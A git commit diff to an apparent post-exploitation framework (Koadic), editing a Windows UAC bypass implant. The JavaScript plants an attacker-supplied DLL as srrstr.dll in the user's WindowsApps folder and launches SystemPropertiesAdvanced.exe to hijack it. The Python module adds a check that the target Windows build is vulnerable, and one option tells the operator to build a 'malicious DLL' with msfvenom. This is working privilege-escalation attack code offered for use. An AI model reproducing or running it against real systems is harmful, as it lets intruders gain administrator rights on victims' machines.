36885a5ac935b7310807a3062b65b5ee6d2e67c3
TheNaterz <nate.caroe@risksense.com>
2020-02-27 14:00:45 -0700

    added a ;, removed payload bits, add build check

--- data/implant/elevate/bypassuac_systempropertiesadvanced.js
+++ data/implant/elevate/bypassuac_systempropertiesadvanced.js
@@ -2,7 +2,7 @@ try
 {
     var myObject = new ActiveXObject("Scripting.FileSystemObject");
     var myPath = "C:\\Users\\"+ '~USER~' + "\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll";
-    var dll = '~DLL~'
+    var dll = '~DLL~';
     myObject.CopyFile (dll, myPath);
     myObject.DeleteFile(dll);
     Koadic.shell.run("C:\\Windows\\syswow64\\systempropertiesadvanced.exe", true);
--- modules/implant/elevate/bypassuac_systempropertiesadvanced.py
+++ modules/implant/elevate/bypassuac_systempropertiesadvanced.py
@@ -4,11 +4,11 @@ import uuid
 
 class SystemPropertiesAdvancedJob(core.job.Job):
     def create(self):
-        id = self.options.get("PAYLOAD")
-        payload = self.load_payload(id)
-        self.options.set("PAYLOAD_DATA", payload)
         if self.session_id == -1:
             return
+        if (int(self.session.build) < 14393 or int(self.session.build) >= 18632) and self.options.get("IGNOREBUILD") == "false":
+            self.error("0", "The target may not be vulnerable to this implant. Set IGNOREBUILD to true to run anyway.", "Target build not vuln", "")
+            return False
 
     def done(self):
         self.display()
@@ -24,22 +24,13 @@ class SystemPropertiesAdvancedImplant(core.implant.Implant):
     STATE = "implant/elevate/bypassuac_systempropertiesadvanced"
 
     def load(self):
-        self.options.register("PAYLOAD", "0", "No need to touch it, it is not used in this bypass")
         self.options.register("USER", "", "Current User")
         self.options.register("DLL", "", "Malicius DLL. First use msfvenom and upload it to Windows. Example: C:/Users/IEUser/Desktop/srrstr.dll")
-        self.options.register("PAYLOAD_DATA", "", "the actual data", hidden=True)
 
     def job(self):
         return SystemPropertiesAdvancedJob
 
     def run(self):
-        id = self.options.get("PAYLOAD")
-        payload = self.load_payload(id)
-
-        if payload is None:
-            self.shell.print_error("Payload %s not found." % id)
-            return
-
         workloads = {}
         workloads["js"] = "data/implant/elevate/bypassuac_systempropertiesadvanced.js"
 
